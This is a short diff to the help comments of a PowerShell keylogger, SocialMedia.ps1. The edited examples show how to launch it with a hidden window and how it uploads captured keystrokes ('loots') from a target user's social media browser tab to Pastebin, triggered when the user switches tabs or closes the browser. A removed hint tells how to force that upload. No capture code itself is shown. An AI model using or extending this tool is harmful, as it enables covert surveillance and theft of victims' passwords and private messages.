@@ -76,7 +76,7 @@
 
 .EXAMPLE
    PS C:\> .\SocialMedia.ps1 -mode 'start' -PastebinUsername 'pedro_testing' -PastebinPassword 'angelapastebin' -SendToPasteBin
-   Start key`logger and send logfile to pastebin everytime void.log is renamed or CTRL+C its detected while recording keystrokes.
+   Start key`logger and send logfile to pastebin everytime target user changes\exit social media browser active tab
 
 .EXAMPLE
    PS C:\> Start-Process -WindowStyle hidden powershell -argumentlist "-file SocialMedia.ps1 -mode 'start' -delay '200' -force"
@@ -309,9 +309,6 @@ function Invoke-SendToPasteBin ()
       Remark: SendToPasteBin function sends loot's to pastebin in 2 diferent ways:
       1 - Target user switchs from facebook tab to a diferent tab => SendToPasteBin
       2 - Browser closes (key`logger waits for browser to restart) => SendToPasteBin
-
-      Hint: force 'SendToPasteBin' function to run before leaking captures.
-      Example: start https://elgoog.im/pacman;.\socialmedia.ps1 -mode stop
    #>
 
    If(-not(Test-Path -Path "$PasteThisFile" -EA SilentlyContinue))
